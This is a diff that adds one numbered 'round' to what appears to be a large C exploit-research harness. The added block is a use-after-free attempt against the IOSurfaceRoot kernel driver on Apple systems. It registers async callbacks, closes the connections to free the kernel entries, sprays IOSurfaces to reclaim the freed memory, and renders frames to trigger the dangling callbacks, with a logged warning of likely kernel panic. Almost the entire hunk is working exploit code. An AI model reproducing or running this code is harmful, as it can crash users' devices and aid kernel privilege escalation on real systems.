@@ -19602,6 +19602,119 @@ new_modes:
             rlog("*** r=250 complete ***\n");
             goto done;
         }
+        if (rounds == 251) {
+            rlog("*** rounds=251: Connection-teardown UAF ***\n");
+            rlog("  Register async callbacks, close connection (frees entries),\n");
+            rlog("  spray IOSurfaces to reclaim freed memory, render to fire dangling callbacks\n\n");
+
+            char r251_sp[256];
+            { char *h = getenv("HOME"); snprintf(r251_sp, sizeof(r251_sp), "%s/Documents/uaf251_state.bin", h?h:"/tmp"); }
+            int r251_att = 0;
+            { FILE *f = fopen(r251_sp, "rb"); if (f) { uint32_t m; if (fread(&m,4,1,f)==1 && m==0xDEAD0251) fread(&r251_att,4,1,f); fclose(f); } }
+            r251_att++;
+            rlog("  Attempt #%d\n", r251_att);
+            { FILE *f = fopen(r251_sp, "wb"); if (f) { uint32_t m=0xDEAD0251; fwrite(&m,4,1,f); fwrite(&r251_att,4,1,f); fflush(f); fsync(fileno(f)); fclose(f); } }
+
+            io_service_t r251_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            if (!r251_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r251_done; }
+
+            int r251_num_conns = 10;
+            int r251_regs_per_conn = 200;
+            int r251_spray_count = 500;
+            if (argc > 3) r251_num_conns = atoi(argv[3]);
+            if (argc > 4) r251_regs_per_conn = atoi(argv[4]);
+            if (argc > 5) r251_spray_count = atoi(argv[5]);
+            rlog("  Connections: %d  Regs/conn: %d  Spray: %d\n",
+                 r251_num_conns, r251_regs_per_conn, r251_spray_count);
+
+            int r251_total_regs = r251_num_conns * r251_regs_per_conn;
+            mach_port_t *r251_wps = calloc(r251_total_regs, sizeof(mach_port_t));
+            for (int i = 0; i < r251_total_regs; i++) {
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &r251_wps[i]);
+                mach_port_insert_right(mach_task_self(), r251_wps[i], r251_wps[i], MACH_MSG_TYPE_MAKE_SEND);
+            }
+            rlog("  Allocated %d wake ports\n", r251_total_regs);
+
+            io_connect_t *r251_conns = calloc(r251_num_conns, sizeof(io_connect_t));
+            int r251_reg_ok = 0, r251_reg_fail = 0;
+
+            for (int c = 0; c < r251_num_conns; c++) {
+                IOServiceOpen(r251_svc, mach_task_self(), 0, &r251_conns[c]);
+                if (!r251_conns[c]) { rlog("  conn %d failed\n", c); continue; }
+
+                uint64_t inp[3] = {1, 2, 3};
+                for (int r = 0; r < r251_regs_per_conn; r++) {
+                    int idx = c * r251_regs_per_conn + r;
+                    uint64_t ref = 0xD251 + idx;
+                    kern_return_t kr = IOConnectCallAsyncMethod(r251_conns[c], 17,
+                        r251_wps[idx], &ref, 1,
+                        NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+                    if (kr == 0) r251_reg_ok++;
+                    else r251_reg_fail++;
+                }
+            }
+            rlog("  Phase 1: Registered %d/%d async callbacks\n", r251_reg_ok, r251_reg_fail);
+
+            rlog("  Phase 2: Closing all connections (freeing kernel entries)...\n");
+            for (int c = 0; c < r251_num_conns; c++) {
+                if (r251_conns[c]) IOServiceClose(r251_conns[c]);
+            }
+            rlog("  All connections closed — entries freed\n");
+
+            rlog("  Phase 3: Spraying %d IOSurfaces...\n", r251_spray_count);
+            CFMutableDictionaryRef r251_props = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int r251_w = 32, r251_h = 32, r251_bpe = 4, r251_pf = 0x42475241;
+            CFNumberRef r251_wn = CFNumberCreate(NULL, kCFNumberIntType, &r251_w);
+            CFNumberRef r251_hn = CFNumberCreate(NULL, kCFNumberIntType, &r251_h);
+            CFNumberRef r251_bn = CFNumberCreate(NULL, kCFNumberIntType, &r251_bpe);
+            CFNumberRef r251_pfn = CFNumberCreate(NULL, kCFNumberIntType, &r251_pf);
+            CFDictionarySetValue(r251_props, CFSTR("IOSurfaceWidth"), r251_wn);
+            CFDictionarySetValue(r251_props, CFSTR("IOSurfaceHeight"), r251_hn);
+            CFDictionarySetValue(r251_props, CFSTR("IOSurfaceBytesPerElement"), r251_bn);
+            CFDictionarySetValue(r251_props, CFSTR("IOSurfacePixelFormat"), r251_pfn);
+
+            IOSurfaceRef *r251_surfs = calloc(r251_spray_count, sizeof(IOSurfaceRef));
+            int r251_spray_ok = 0;
+            for (int i = 0; i < r251_spray_count; i++) {
+                r251_surfs[i] = IOSurfaceCreate(r251_props);
+                if (r251_surfs[i]) r251_spray_ok++;
+            }
+            rlog("  Sprayed %d/%d IOSurfaces\n", r251_spray_ok, r251_spray_count);
+
+            rlog("  Phase 4: Render loop (5s) — waiting for dangling callback to fire...\n");
+            rlog("  >>> WARNING: HIGH PROBABILITY OF KERNEL PANIC <<<\n");
+            fflush(stdout);
+
+            p13_render_run = 1;
+            p13_render_frames = 0;
+            pthread_t r251_rt;
+            pthread_create(&r251_rt, NULL, p13_render_loop, NULL);
+            for (int s = 0; s < 5; s++) {
+                usleep(1000000);
+                rlog("  +%ds frames=%d\n", s+1, p13_render_frames);
+            }
+            p13_render_run = 0;
+            pthread_join(r251_rt, NULL);
+
+            rlog("\n  === SURVIVED connection-teardown UAF! ===\n");
+            rlog("  Total frames=%d\n", p13_render_frames);
+
+            for (int i = 0; i < r251_spray_count; i++)
+                if (r251_surfs[i]) CFRelease(r251_surfs[i]);
+            free(r251_surfs);
+            for (int i = 0; i < r251_total_regs; i++)
+                mach_port_deallocate(mach_task_self(), r251_wps[i]);
+            free(r251_wps);
+            free(r251_conns);
+            CFRelease(r251_props); CFRelease(r251_wn); CFRelease(r251_hn);
+            CFRelease(r251_bn); CFRelease(r251_pfn);
+            IOObjectRelease(r251_svc);
+            r251_done:
+            rlog("*** r=251 complete ***\n");
+            goto done;
+        }
         if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
